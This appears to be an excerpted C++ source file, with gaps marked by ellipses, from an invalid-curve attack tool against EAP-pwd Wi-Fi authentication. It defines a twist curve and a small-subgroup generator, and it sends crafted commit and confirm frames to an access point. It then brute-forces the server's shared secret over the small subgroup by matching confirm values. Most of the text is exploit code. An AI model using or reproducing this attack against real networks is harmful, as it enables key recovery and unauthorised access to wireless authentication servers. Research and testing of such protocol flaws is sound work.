...
static constexpr array<uint8_t,32> SUB_GX = {
	0x6b, 0xfe, 0x1a, 0x57, 0x02, 0x46, 0x8a, 0xc7, 0xe2, 0xe7, 0xef, 0xd2, 0x2a, 0x25, 0xcc, 0xf5, 0x1a, 0xda, 0xbf,
	0x60, 0xd3, 0x85, 0x17, 0x33, 0x2f, 0x07, 0xd2, 0x2f, 0x9a, 0x88, 0x75, 0x55
};
static constexpr array<uint8_t,32> SUB_GY = {
	0x75, 0x82, 0xb0, 0x15, 0x15, 0x68, 0x89, 0xef, 0x88, 0xe5, 0x03, 0x05, 0x4b, 0xd9, 0x71, 0x75, 0xdf, 0xb6, 0x19,
	0x7c, 0x94, 0x32, 0xa4, 0xfc, 0x6c, 0xfb, 0x07, 0x5e, 0xcb, 0x2d, 0xb9, 0x2d
};
...
static constexpr array<uint8_t,32> TWIST_B = {
	0xfe, 0x52, 0x40, 0xb6, 0xee, 0x72, 0x73, 0xd1, 0x43, 0x09, 0xcc, 0x22, 0xf0, 0x66, 0x4a, 0xd4, 0x5a, 0xd7, 0x6d,
	0x4b, 0x13, 0x89, 0x95, 0x2c, 0x3f, 0xd9, 0xf8, 0x54, 0xd5, 0x5b, 0xfa, 0x80
};
// Group order for the twist curve
static constexpr array<uint8_t,32> TWIST_N = {
	0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x0b, 0x2e, 0x09,
	0x5b, 0x89, 0x8d, 0xf5, 0xb3, 0xf5, 0x9b, 0x25, 0xb0, 0x68, 0xb3, 0xa4, 0x7d
};
...
static array<uint8_t,32> pwd_confirm(const array<uint8_t,32> &k_x, const array<uint8_t,64> &e1,
									const array<uint8_t,32> &s1, const array<uint8_t,64> &e2,
									const array<uint8_t,32> &s2
){
	vector<uint8_t> buf;
...
static vector<uint8_t> make_pwd_eapol(const uint8_t eap_id, const uint8_t opcode, const uint8_t *payload,
									const size_t len
){
...
static optional<array<uint8_t,32>> brute_force_k(const array<uint8_t,64> &server_elem,
	...
	for(int i = 1; i < 269 && !result; i++){
		...
		if(pwd_confirm(kx_bytes, server_elem, server_scal, our_elem, our_scal) == server_confirm) result = kx_bytes;
	}
...
bool run_invalid_curve_exchange(EAP_Att &eap_att){
	...
	array<uint8_t,32> server_scal{};
	{
		...
		const auto e = wait_eapol(eap_att, [&](const vector<uint8_t> &v){
			...
			if(f && f->opcode == PWD_OPCODE_COMMIT){
				frame = f;
				return true;
			}
			return false;
		...
		if(!e || e->empty()){
			log(LogLevel::WARNING, "No EAP-PWD-Commit request");
			return false;
		}
		if(frame->pwd_data.size() < 96){
			log(LogLevel::WARNING, "Server commit payload too short ({} bytes)",
	...
	// EAP-PWD-Confirm: brute-force k_x, compute and send our confirm
	{
		...
		const auto e = wait_eapol(eap_att, [&](const vector<uint8_t> &v){
			const auto f = parse_eap_pwd(v);
			if(f && f->opcode == PWD_OPCODE_CONFIRM){
				frame = f;
				return true;
			}
			return false;
		...
		if(!e || e->empty()){
			log(LogLevel::WARNING, "No EAP-PWD-Confirm request");
			return false;
		}
		if(frame->pwd_data.size() < 32){
			log(LogLevel::WARNING, "Server confirm payload too short");
			return false;
		}
...
void run_attack(RunStatus &rs){
	...
	EAP_Att eap_att{
		sock, channel, our_mac, ap_mac, ssid, identity, milliseconds{30000} // 30s
	};
